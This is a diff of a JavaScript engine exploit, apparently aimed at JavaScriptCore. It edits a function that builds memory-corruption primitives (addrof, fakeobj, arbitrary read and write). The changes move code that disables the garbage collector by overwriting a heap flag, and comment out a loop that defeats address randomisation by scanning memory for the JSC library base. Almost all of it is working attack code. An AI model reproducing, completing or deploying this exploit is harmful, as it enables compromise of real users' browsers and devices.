@@ -218,6 +218,24 @@ function buildDSScribblePrimitives(addrof, fakeobj) {
         report.stage = "prove-typed-array-backing-store";
         const proofKeepAlive = [];
 
+            
+            //log("Fetching JSC_base");
+            //const executable = read64(addrof(parseFloat) + 0x18n).noPAC();
+               //     globalFuncParseFloat = read64(executable + 0x28n);
+                    //const jsc_base= (function () {
+                        //let jsc_base = globalFuncParseFloat & ~0xfffn;
+
+                        //while (1) {
+                           //todo fix by adding the biguint64arr back 
+                            // read64_biguint64arr[1] = jsc_base;
+                            //if (read64_str.charCodeAt(0) == 0xfacf && read64_str.charCodeAt(1) == 0xfeed) {
+                                //return jsc_base;
+                          //  }
+                            //jsc_base -= 0x1000n;
+                        //}
+                   // })();
+                    //log("jsc_base: " + jsc_base.hex());
+                    
         function proveBackingStore(label, seed) {
             const proofBuffer = new ArrayBuffer(0x180);
             const proofView = new DataView(proofBuffer);
@@ -234,39 +252,7 @@ function buildDSScribblePrimitives(addrof, fakeobj) {
             // Normal JS writes first; the primitive must independently read
             // both offsets from the candidate backing store.
             proofView.setBigUint64(0x00, markerA, true);
-            proofView.setBigUint64(0x40, markerB, true);
-            //DISABLE GC
-            ///DISABLE WORKLET GC
-            const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
-            log("vm:" + vm);
-            const heap = vm + 0xc0n;
-            log("heap:" + heap);
-            const isSafeToCollect = heap + 0x241n;
-            function write8(ptr, u16) {
-                    let value = read64(ptr);
-                    value &= ~0xffn;
-                    value |= u16;
-                    write64(ptr, value);
-                };
-            write8(isSafeToCollect, 0n);
-            log("GC disabled", "ok");
-            log("Fetching JSC_base")
-            const executable = read64(addrof(parseFloat) + 0x18n);
-                    globalFuncParseFloat = read64(executable + 0x28n).noPAC();
-                    const jsc_base = (function () {
-                        let jsc_base = globalFuncParseFloat & ~0xfffn;
-
-                        while (1) {
-                           //todo fix by adding the biguint64arr back 
-                            // read64_biguint64arr[1] = jsc_base;
-                            if (read64_str.charCodeAt(0) == 0xfacf && read64_str.charCodeAt(1) == 0xfeed) {
-                                return jsc_base;
-                            }
-                            jsc_base -= 0x1000n;
-                        }
-                    })();
-                    log("jsc_base: " + jsc_base.hex());
-            //END 
+            proofView.setBigUint64(0x40, markerB, true); 
             const vectorRaw = read64(addrof(proofU8) + 0x10n);
             if (label === "primary") report.vectorRaw = vectorRaw;
 
@@ -324,6 +310,21 @@ function buildDSScribblePrimitives(addrof, fakeobj) {
         report.backingPtr = primaryProof.backingPtr;
         report.secondaryBackingPtr = secondaryProof.backingPtr;
         report.proofs = 2;
+                        //DISABLE GC
+            ///DISABLE WORKLET GC
+            const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
+            log("vm:" + vm);
+            const heap = vm + 0xc0n;
+            log("heap:" + heap);
+            const isSafeToCollect = heap + 0x241n;
+            function write8(ptr, u16) {
+                    let value = read64(ptr);
+                    value &= ~0xffn;
+                    value |= u16;
+                    write64(ptr, value);
+                };
+            write8(isSafeToCollect, 0n);
+            log("GC disabled", "ok")
         return {
             ok: true,
             report,
